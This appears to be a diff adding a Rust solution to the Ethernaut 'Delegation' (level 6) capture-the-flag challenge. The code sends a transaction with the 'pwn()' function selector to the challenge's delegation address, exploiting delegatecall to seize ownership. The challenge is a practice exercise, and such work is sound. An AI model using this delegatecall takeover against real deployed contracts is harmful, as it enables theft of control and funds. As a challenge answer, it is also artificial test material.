@@ -15,7 +15,14 @@ impl Solution for EthernautLevel6Solution {
         challenge: &Self::Level,
         offender: Actor,
     ) -> eyre::Result<()> {
-        todo!("Solve me!")
+        let tx = TransactionRequest::new()
+            .to(challenge.delegation_address)
+            .gas(U256::from(10_000_000))
+            .data(keccak256("pwn()").into_iter().take(4).collect::<Vec<u8>>());
+
+        offender.send_transaction(tx, None).await?.await?;
+
+        Ok(())
     }
 }
 
